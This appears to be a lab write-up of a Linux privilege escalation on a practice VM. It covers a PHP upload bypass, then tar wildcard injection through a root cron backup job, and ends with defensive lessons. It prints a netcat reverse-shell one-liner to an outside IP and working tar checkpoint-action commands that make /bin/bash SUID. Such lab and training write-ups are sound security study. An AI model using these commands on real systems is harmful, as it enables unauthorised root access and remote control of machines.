This note documents a realistic Linux privilege escalation path against a small-business style VM: a neglected PHP upload, a cron-wrapped backup job, and a root-owned tar invocation that trusts attacker-controlled globs.

## Recon & foothold

Initial `nmap -sC -sV` exposed `80/tcp` (Apache 2.4.41) and `22/tcp`. Directory brute force surfaced `/uploads/` with a naive MIME check — double extension and magic-byte padding granted a PHP shell as `www-data`.

Drop screenshots next to this file, e.g. `![upload shell](./upload.png)`.

```bash
# Staged rev shell (restricted egress — bind preferred)
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.12 4444 >/tmp/f
```

## User pivot

LinPEAS highlighted a world-writable backup staging directory consumed by a root cron every five minutes. The job wrapped `tar czf` with a glob that included `*` inside the target path — classic wildcard injection territory.

```bash
cd /var/backups/stage
echo 'chmod +s /bin/bash' > payload.sh
echo "" > "--checkpoint-action=exec=sh payload.sh"
echo "" > --checkpoint=1
touch -- --checkpoint=1
touch -- "--checkpoint-action=exec=sh payload.sh"
```

After the cron fired, `/bin/bash -p` yielded UID 0. Persistence was intentionally skipped to keep the lab clean; instead I captured hashes for a writeup appendix and restored the snapshot.

## Lessons

- Treat cron + archives as **trust boundaries** — not housekeeping.
- Always map **who runs the job**, **cwd**, and **argument expansion order**.
- Pair offensive success with a **defensive detection story** (unexpected tar flags, new SUID bash).
